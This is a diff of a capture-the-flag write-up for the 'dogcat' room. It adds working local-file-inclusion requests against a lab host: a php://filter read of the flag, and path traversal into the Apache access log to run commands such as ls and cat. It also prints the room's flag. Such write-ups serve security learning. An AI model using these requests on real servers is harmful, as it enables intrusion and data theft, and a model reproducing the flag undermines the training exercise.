@@ -1,4 +1,4 @@
-# dogcat
+<img width="1469" height="245" alt="image" src="https://github.com/user-attachments/assets/a779d5a9-afae-41a1-975a-241e79bbeaea" /># dogcat
 
 <details>
     <summary></summary>
@@ -351,16 +351,6 @@ PGltZyBzcmM9ImRvZ3MvPD9waHAgZWNobyByYW5kKDEsIDEwKTsgPz4uanBnIiAvPg0K
 
 
 
-```
-http://10.10.43.88/?view=php://filter/read=convert.base64-encode/resource=./dog/../flag
-```
-
-<img width="1021" height="179" alt="image" src="https://github.com/user-attachments/assets/5732c078-d071-41a8-bab8-e2a354a91520" />
-
-
-```
-$flag_1 = "THM{Th1s_1s_N0t_4_Catdog_ab67edfa}"
-```
 
 
 
@@ -518,9 +508,29 @@ because:
 --- 
 
 
+> ## try list content
+
+```
+view-source:http://10.10.43.88/?view=dog/../../../../../../../../../var/log/apache2/access.log&ext=&c=ls
+```
+
+<img width="1469" height="245" alt="image" src="https://github.com/user-attachments/assets/410a61f0-18eb-4ef0-ab6b-ddf6663cf0d8" />
+
+> #### get the flag
+
+```
+http://10.10.43.88/?view=php://filter/read=convert.base64-encode/resource=./dog/../flag
+or
+http://10.10.43.88/?view=dog/../../../../../../../../../var/log/apache2/access.log&ext=&c=cat%20flag.php
+```
+
+<img width="1021" height="179" alt="image" src="https://github.com/user-attachments/assets/5732c078-d071-41a8-bab8-e2a354a91520" />
+
+<img width="801" height="107" alt="image" src="https://github.com/user-attachments/assets/852fc3b9-fdb4-43f5-8b50-976dc1cefb23" />
 
 
-
-
+```
+$flag_1 = "THM{Th1s_1s_N0t_4_Catdog_ab67edfa}"
+```
 
 
